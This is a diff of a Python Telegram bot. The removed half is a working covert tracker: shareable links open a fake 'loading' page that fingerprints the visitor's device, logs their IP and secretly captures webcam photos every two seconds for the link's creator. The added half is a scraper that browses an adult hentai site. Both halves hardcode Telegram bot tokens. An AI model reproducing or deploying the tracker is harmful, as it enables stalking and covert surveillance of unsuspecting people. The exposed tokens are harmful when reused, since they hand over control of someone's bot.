@@ -1,276 +1,187 @@
-#!/usr/bin/env python3
-import os
-import json
-import uuid
-import base64
-import asyncio
-import logging
-from io import BytesIO
-from aiohttp import web
-from telegram import Update, InputFile
-from telegram.ext import Application, CommandHandler, ContextTypes
+import re
+import requests
+from bs4 import BeautifulSoup
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, MessageHandler, filters, CallbackQueryHandler, CommandHandler, ContextTypes
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+BOT_TOKEN = "8571420841:AAHy2j_GhUMRqOFDixbGhnQ6z3b6NswcU1E"
+BASE_SITE = "https://www.hentai.name"
+CDN_SITE = "https://pics.hentai.name"
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
-WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip()
-PORT = int(os.getenv("PORT", "8000"))
+# -------------------- Helper Functions --------------------
+def slugify(term):
+    return re.sub(r"\s+", "-", term.strip())
 
-# Token -> user_id (doim saqlanadi, hech qachon o'chirilmaydi)
-USER_TOKENS = {}
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    # Har doim yangi token yaratiladi, lekin eski tokenlar ham ishlashda davom etadi
-    token = str(uuid.uuid4())
-    USER_TOKENS[token] = user_id
-    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
-    msg = (
-        "👋 Salom!\n\n"
-        "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
-        f"🔗 {link}\n\n"
-        "Havola cheksiz muddat ishlaydi. Uni istalgan kishiga yuborishingiz mumkin.\n"
-        "Har kim havolaga kirsangiz, uning ma'lumotlari sizga yuboriladi."
-    )
-    await update.message.reply_text(msg)
-
-def get_client_ip(request: web.Request) -> str:
-    hdr = request.headers.get("X-Forwarded-For")
-    if hdr:
-        return hdr.split(",")[0].strip()
-    rem = request.remote
-    if rem:
-        return rem
-    peer = request.transport.get_extra_info("peername")
-    if peer:
-        return str(peer[0])
-    return "Noma'lum"
-
-async def track_page(request: web.Request):
-    token = request.query.get("token")
-    if not token or token not in USER_TOKENS:
-        return web.Response(text="❌ Noto‘g‘ri token", status=403)
-
-    html = f"""<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8" />
-  <title>Yuklanmoqda...</title>
-  <style>
-    body {{
-      font-family: sans-serif;
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      height: 100vh; text-align: center;
-      background: #fafafa; color: #333;
-    }}
-    .loader {{
-      width: 40px; height: 40px;
-      border: 4px solid #ddd;
-      border-top: 4px solid #4CAF50;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px;
-    }}
-    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
-    .note {{ font-size: 0.9em; color: #777; }}
-  </style>
-</head>
-<body>
-  <h2>Iltimos, kuting...</h2>
-  <div class="loader"></div>
-  <div class="note">Tajribangiz moslashtirilmoqda...</div>
-  <script>
-    let stream = null;
-    let cameraAllowed = false;
-
-    async function collectData() {{
-        const data = {{
-          timestamp: new Date().toISOString(),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          utcOffset: -new Date().getTimezoneOffset() / 60,
-          languages: navigator.languages.join(', '),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          deviceMemory: navigator.deviceMemory || "Noma'lum",
-          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
-          screen: `${{screen.width}}x${{screen.height}}`,
-          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
-          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
-          browser: "Noma'lum",
-          os: "Noma'lum",
-          model: "Noma'lum",
-          devices: {{ mic: 0, speaker: 0, camera: 0 }},
-          gpu: "Noma'lum",
-          cameraRes: "Noma'lum",
-          network: "Noma'lum"
-        }};
-
-        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
-        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
-        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
-
-        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
-        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
-        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
-        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
-
-        try {{
-          const devs = await navigator.mediaDevices.enumerateDevices();
-          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
-          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
-          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
-        }} catch (e) {{}}
-
-        try {{
-          const canvas = document.createElement("canvas");
-          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-          if (dbg) {{
-            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-          }}
-        }} catch (e) {{}}
-
-        if (navigator.connection) {{
-          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
-        }}
-
-        return data;
-    }}
-
-    async function sendReport(imageData = null) {{
-        const data = await collectData();
-        const body = {{
-            token: "{token}",
-            clientData: data,
-            cameraAllowed: cameraAllowed
-        }};
-        if (imageData) {{
-            body.image = imageData;
-        }}
-        try {{
-            await fetch("/submit", {{
-                method: "POST",
-                headers: {{ "Content-Type": "application/json" }},
-                body: JSON.stringify(body)
-            }});
-        }} catch (e) {{ console.error("Yuborishda xato:", e); }}
-    }}
-
-    async function startCameraAndCapture() {{
-        try {{
-            stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
-            cameraAllowed = true;
-            const track = stream.getVideoTracks()[0];
-            const settings = track.getSettings();
-            // Birinchi marta ma'lumot + rasm yuborish
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            await video.play();
-
-            const captureFrame = () => {{
-                const c = document.createElement("canvas");
-                c.width = video.videoWidth || 640;
-                c.height = video.videoHeight || 480;
-                c.getContext("2d").drawImage(video, 0, 0);
-                const img = c.toDataURL("image/jpeg", 0.7);
-                sendReport(img);
-            }};
-
-            // Birinchi rasmni darhol yuborish
-            captureFrame();
-
-            // Keyin har 2 soniyada takrorlash
-            setInterval(captureFrame, 2000);
-
-        }} catch (e) {{
-            cameraAllowed = false;
-            // Faqat bir marta ma'lumot yuborish
-            sendReport();
-        }}
-    }}
-
-    // Ishga tushirish
-    startCameraAndCapture();
-  </script>
-</body>
-</html>"""
-    return web.Response(text=html, content_type="text/html")
-
-async def submit_data(request: web.Request):
+def search_mangas(term, page=1):
+    url = f"{BASE_SITE}/search/{slugify(term)}/?p={page}"
+    headers = {"User-Agent": "Mozilla/5.0"}
     try:
-        body = await request.json()
-        token = body.get("token")
-        client_data = body.get("clientData", {})
-        camera_allowed = body.get("cameraAllowed", False)
-        user_id = USER_TOKENS.get(token)
-        
-        if not user_id:
-            return web.Response(status=403, text="Token not found")
+        r = requests.get(url, headers=headers, timeout=10)
+        r.raise_for_status()
+    except Exception:
+        return [], None, None
+    soup = BeautifulSoup(r.text, "html.parser")
+    results = []
+    for a in soup.select("a.cover"):
+        img = a.find("img")
+        caption = a.find("div", class_="caption")
+        results.append({
+            "link": a.get("href"),
+            "title": caption.text.strip() if caption else "Noma'lum",
+            "poster": img["src"] if img else None
+        })
+    next_page = page + 1 if soup.select("a.next") else None
+    prev_page = page - 1 if page > 1 else None
+    return results, next_page, prev_page
 
-        ip = get_client_ip(request)
-        devs = client_data.get("devices", {})
+def manga_poster_url(manga_link):
+    manga_id = int(manga_link.strip("/").split("/")[-1])
+    first3 = str(manga_id).zfill(6)[:3]
+    base_url = f"{CDN_SITE}/000/{first3}/{manga_id}"
+    poster = f"{base_url}/poster_1.webp"
+    return poster
 
-        message = (
-            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
-            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
-            f"📍 IP: {ip}\n"
-            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
-            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
-            f"🎮 GPU: {client_data.get('gpu')}\n"
-            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
-            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
-            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
-            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
-            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
-            f"📶 Tarmoq: {client_data.get('network')}\n"
-            f"🗣 Tillar: {client_data.get('languages')}\n"
-            f"🔍 UA: {client_data.get('userAgent')}\n"
-            f"📷 Kamera: {'✅ Ruxsat berildi' if camera_allowed else '❌ Ruxsat berilmadi'}"
+def manga_image_url(manga_link, index):
+    manga_id = int(manga_link.strip("/").split("/")[-1])
+    first3 = str(manga_id).zfill(6)[:3]
+    base_url = f"{CDN_SITE}/000/{first3}/{manga_id}"
+    return f"{base_url}/{index+1}.webp"
+
+# -------------------- Sessions --------------------
+sessions = {}  # chat_id -> {'results':[], 'index':0, 'page':1, 'term':str, 'message_id':int}
+
+# -------------------- Bot Handlers --------------------
+async def start(update: ContextTypes.DEFAULT_TYPE, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "Salom! Manga qidirish uchun nomini yozing.\n"
+        "Masalan: Naruto, One Piece va boshqalar."
+    )
+
+async def text_handler(update: ContextTypes.DEFAULT_TYPE, context: ContextTypes.DEFAULT_TYPE):
+    term = update.message.text.strip()
+    results, next_page, prev_page = search_mangas(term)
+    if not results:
+        await update.message.reply_text("Hech narsa topilmadi 😔")
+        return
+    chat_id = update.message.chat_id
+    sessions[chat_id] = {'results': results, 'index': 0, 'page':1, 'term': term}
+    await send_search_results(chat_id, context, results, next_page, prev_page)
+
+async def send_search_results(chat_id, context, results, next_page=None, prev_page=None, edit=False):
+    keyboard = [[InlineKeyboardButton(r['title'], callback_data=f"select|{r['link']}")] for r in results[:10]]
+    nav_buttons = []
+    if prev_page: nav_buttons.append(InlineKeyboardButton("Oldingi sahifa", callback_data=f"page|{sessions[chat_id]['term']}|{prev_page}"))
+    if next_page: nav_buttons.append(InlineKeyboardButton("Keyingi sahifa", callback_data=f"page|{sessions[chat_id]['term']}|{next_page}"))
+    if nav_buttons: keyboard.append(nav_buttons)
+    text = "Biror manga tanlang:"
+    if edit:
+        await context.bot.edit_message_text(chat_id=chat_id,
+                                            message_id=sessions[chat_id]['message_id'],
+                                            text=text,
+                                            reply_markup=InlineKeyboardMarkup(keyboard))
+    else:
+        msg = await context.bot.send_message(chat_id=chat_id, text=text,
+                                             reply_markup=InlineKeyboardMarkup(keyboard))
+        sessions[chat_id]['message_id'] = msg.message_id
+
+async def send_manga_prompt(chat_id, context, edit=False):
+    session = sessions[chat_id]
+    index = session['index']
+    manga = session['results'][index]
+    poster = manga_poster_url(manga['link'])
+    caption = f"{manga['title']}\nO‘qishni boshlamoqchimisiz?"
+    keyboard = [
+        [
+            InlineKeyboardButton("Ha", callback_data=f"read|{manga['link']}|0"),
+            InlineKeyboardButton("Yo'q", callback_data="next_manga")
+        ]
+    ]
+    if edit:
+        await context.bot.edit_message_media(chat_id=chat_id,
+                                             message_id=session['message_id'],
+                                             media={'type':'photo','media':poster},
+                                             reply_markup=InlineKeyboardMarkup(keyboard))
+        await context.bot.edit_message_caption(chat_id=chat_id,
+                                               message_id=session['message_id'],
+                                               caption=caption,
+                                               reply_markup=InlineKeyboardMarkup(keyboard))
+    else:
+        msg = await context.bot.send_photo(chat_id=chat_id,
+                                           photo=poster,
+                                           caption=caption,
+                                           reply_markup=InlineKeyboardMarkup(keyboard))
+        session['message_id'] = msg.message_id
+
+async def button_handler(update: ContextTypes.DEFAULT_TYPE, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    chat_id = q.message.chat_id
+    session = sessions.get(chat_id)
+    if not session:
+        await q.edit_message_text("Sessiya tugagan. Iltimos, yangi nom yozing.", reply_markup=None)
+        return
+
+    data = q.data.split("|")
+    if data[0] == "read":
+        manga_link = data[1]
+        index = int(data[2])
+        url = manga_image_url(manga_link, index)
+        keyboard = [
+            [
+                InlineKeyboardButton("Oldingi", callback_data=f"read|{manga_link}|{index-1}" if index>0 else f"read|{manga_link}|0"),
+                InlineKeyboardButton("Keyingi", callback_data=f"read|{manga_link}|{index+1}")
+            ],
+            [InlineKeyboardButton("To‘xtatish", callback_data="stop_reading")]
+        ]
+        await q.edit_message_media(
+            media={'type':'photo','media':url},
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
 
-        if camera_allowed and "image" in body:
-            img_data = body["image"]
-            if "," in img_data:
-                b64 = img_data.split(",", 1)[1]
-            else:
-                b64 = img_data
-            try:
-                img_bytes = base64.b64decode(b64)
-                img = BytesIO(img_bytes)
-                img.name = "snapshot.jpg"
-                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
-            except Exception as e:
-                logger.error(f"Rasmni yuborishda xato: {e}")
-                await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.")
+    elif data[0] == "stop_reading":
+        await q.edit_message_caption("O‘qish to‘xtatildi", reply_markup=None)
+
+    elif data[0] == "next_manga":
+        # Keyingi manga
+        if session['index'] + 1 < len(session['results']):
+            session['index'] += 1
+            await send_manga_prompt(chat_id, context, edit=True)
         else:
-            # Faqat ma'lumot (kamera yoqilmasa)
-            await request.app["bot"].send_message(chat_id=user_id, text=message)
+            # Sahifa oxiri bo'lsa, keyingi sahifa yuklash
+            term = session['term']
+            next_page = session['page'] + 1
+            results, next_page_link, prev_page_link = search_mangas(term, page=next_page)
+            if results:
+                session['results'] = results
+                session['index'] = 0
+                session['page'] = next_page
+                await send_manga_prompt(chat_id, context, edit=True)
+            else:
+                await q.edit_message_caption("Ro'yxat tugadi.", reply_markup=None)
 
-        return web.Response(text="ok")
-    except Exception as e:
-        logger.exception("submit_data xato")
-        return web.Response(status=500, text=str(e))
+    elif data[0] == "select":
+        manga_link = data[1]
+        session['index'] = session['results'].index(next(r for r in session['results'] if r['link']==manga_link))
+        await send_manga_prompt(chat_id, context, edit=True)
 
-async def start_web_server(bot):
-    app = web.Application()
-    app["bot"] = bot
-    app.router.add_get("/track", track_page)
-    app.router.add_post("/submit", submit_data)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", PORT)
-    await site.start()
-    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{PORT}")
+    elif data[0] == "page":
+        term, page = data[1], int(data[2])
+        results, next_page, prev_page = search_mangas(term, page)
+        if results:
+            session['results'] = results
+            session['index'] = 0
+            session['page'] = page
+            await send_search_results(chat_id, context, results, next_page, prev_page, edit=True)
+        else:
+            await q.edit_message_text("Hech narsa topilmadi 😔", reply_markup=None)
 
-async def on_startup(app: Application):
-    asyncio.create_task(start_web_server(app.bot))
-
+# -------------------- Main --------------------
 def main():
-    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    print("Bot ishga tushmoqda...")
     app.run_polling()
 
 if __name__ == "__main__":
